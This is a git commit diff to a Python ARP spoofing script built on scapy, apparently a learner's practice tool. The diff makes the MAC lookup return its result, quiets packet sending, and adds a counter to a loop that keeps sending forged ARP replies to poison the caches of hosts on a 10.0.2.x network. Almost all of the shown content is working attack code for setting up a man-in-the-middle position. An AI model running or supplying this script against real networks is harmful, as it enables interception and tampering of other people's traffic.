15cdabcc5ee9784a87629151d09e576651f887d9
Suman <Sumankrishnadey@gmail.com>
2021-06-18 06:24:27 -0400

    date and tie

--- network_spoofer.py
+++ network_spoofer.py
@@ -12,7 +12,7 @@ def get_mac(ip):
     arp_request_broadcast = broadcast / arp_request
     (answered_list) = scapy.srp(arp_request_broadcast, timeout = 1, verbose=False)[0]
 
-    print(answered_list[0][1].hwsrc)
+    return (answered_list[0][1].hwsrc)
 
 
 def spoof(target_ip, spoof_ip):
@@ -20,9 +20,12 @@ def spoof(target_ip, spoof_ip):
     packet = scapy.ARP(op= 2, pdst= target_ip, hwsrc= '08:00:27:08:af:07', psrc= spoof_ip)
     # print(packet.show())
     # print(packet.summary())
-    scapy.send(packet)
+    scapy.send(packet, verbose= False)
 
+sent_packet_count = 0
 while True:
     spoof('10.0.2.2', '10.0.2.3')
     spoof('10.0.2.3', '10.0.2.4')
+    sent_packet_count = sent_packet_count + 2
+    print('[+] Packet sent: ' + str(sent_packet_count)),
     t.sleep(2)
